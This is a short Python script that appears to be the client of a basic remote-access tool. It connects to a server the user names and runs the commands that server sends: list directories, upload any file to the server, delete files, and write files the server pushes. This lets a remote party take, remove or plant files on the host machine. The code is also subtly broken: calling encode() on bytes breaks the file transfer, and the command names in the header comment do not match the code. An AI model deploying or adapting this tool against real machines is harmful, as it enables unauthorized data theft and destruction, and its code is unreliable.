# command list
# view_cwd - will show all files in the dir where the file is running
# custom_dir - will show files from custom directory
# download_files - will download files from dir


import os
import socket

a = socket.socket()
port = 8080
host = input(str("Please enter the server address : "))

a.connect((host,port))
print("")
print("Connected to the server successfully")
print("")

# connection has been completed

# command receiving and execution

while 1:
    command = a.recv(1024)
    command = command.decode()
    print("Command received")
    print("")
    if command == "view_cwd":
        files  = os.getcwd()
        files = str(files)
        a.send(files.encode())
        print("")
        print("Command has been executed successfully..")
        print("")

    
    elif command == "custom_dir":
        user_input = a.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        a.send(files.encode())
        print("")
        print("Command has been executed successfully..")
        print("")


    elif command == "download_file":
        file_path = a.recv(1000000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        a.send(data.encode())
        print("")
        print("File has been sent successfully")
        print("")

    elif command == "remove_file":
        fileanddir = a.recv(100000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Command has been executed successfully")

    elif command == "send_file":
        filename = a.recv(6000)
        print(filename)
        new_file = open(filename, "wb")
        data = a.recv(6000) 
        print(data)
        new_file.write(data)
        new_file.close()

    else:
        print("")
        print("Command not recognised")
